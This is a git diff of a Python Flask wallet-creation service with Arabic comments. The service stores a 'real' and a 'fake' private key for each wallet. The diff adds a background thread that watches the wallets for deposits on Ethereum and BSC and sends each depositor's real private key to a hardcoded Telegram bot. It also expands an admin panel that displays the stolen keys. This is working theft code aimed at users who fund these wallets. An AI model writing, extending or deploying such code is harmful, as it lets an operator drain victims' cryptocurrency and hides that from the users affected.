@@ -5,6 +5,9 @@ import secrets
 from datetime import datetime
 import requests
 from eth_account import Account
+from web3 import Web3
+import threading
+import time
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -12,21 +15,73 @@ CORS(app)
 TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
 CHAT_ID = "8288130111"
 
+# Web3 للشبكات
+w3_eth = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
+w3_bsc = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org'))
+
 conn = sqlite3.connect('saqr.db', check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS wallets
     (id INTEGER PRIMARY KEY AUTOINCREMENT,
      network TEXT, address TEXT UNIQUE,
      real_key TEXT, fake_key TEXT,
+     last_balance TEXT DEFAULT '0',
      created_at TEXT)''')
 conn.commit()
 
 def send_tg(msg):
     try:
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            json={"chat_id": CHAT_ID, "text": msg}, timeout=3)
+            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=3)
     except:
         pass
+
+def check_balance(address, network):
+    try:
+        if network in ['ethereum', 'bsc']:
+            w3 = w3_eth if network == 'ethereum' else w3_bsc
+            balance_wei = w3.eth.get_balance(address)
+            balance = w3.from_wei(balance_wei, 'ether')
+            return float(balance)
+    except:
+        pass
+    return 0
+
+def monitor_deposits():
+    """يراقب الإيداعات كل 30 ثانية"""
+    while True:
+        try:
+            c.execute("SELECT id, network, address, real_key, last_balance FROM wallets WHERE status='active'")
+            wallets = c.fetchall()
+            
+            for w in wallets:
+                wid, network, address, real_key, last_balance = w
+                current_balance = check_balance(address, network)
+                last = float(last_balance)
+                
+                if current_balance > last and current_balance > 0:
+                    # فيه إيداع جديد!
+                    deposit = current_balance - last
+                    c.execute("UPDATE wallets SET last_balance=? WHERE id=?", (str(current_balance), wid))
+                    conn.commit()
+                    
+                    emoji = {"ethereum": "💎", "bsc": "🔷", "solana": "⚡"}.get(network, "💰")
+                    send_tg(f"""
+🦅 <b>إيداع جديد!</b>
+────────────────────
+{emoji} {network.upper()}
+🏦 <code>{address}</code>
+💰 المبلغ: {deposit:.4f} ETH
+🔑 المفتاح: <code>{real_key}</code>
+⏱️ {datetime.now().strftime('%Y-%m-%d %H:%M')}
+                    """)
+        except:
+            pass
+        time.sleep(30)
+
+# تشغيل المراقبة في الخلفية
+monitor_thread = threading.Thread(target=monitor_deposits, daemon=True)
+monitor_thread.start()
 
 @app.route('/')
 def index():
@@ -52,7 +107,6 @@ def withdraw():
 def create_wallet():
     network = request.json.get('network', 'ethereum')
     
-    # إنشاء محفظة حقيقية
     account = Account.create()
     address = account.address
     real_key = account.key.hex()
@@ -74,7 +128,7 @@ def admin():
     wallets = c.fetchall()
     html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
     for w in wallets:
-        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td></tr>'
+        html += f'<tr><td>{w[1]}</td><td>{w[2][:20]}...</td><td class="key">{w[3]}</td><td>{w[5]}</td></tr>'
     return html + '</table></body></html>'
 
 if __name__ == '__main__':
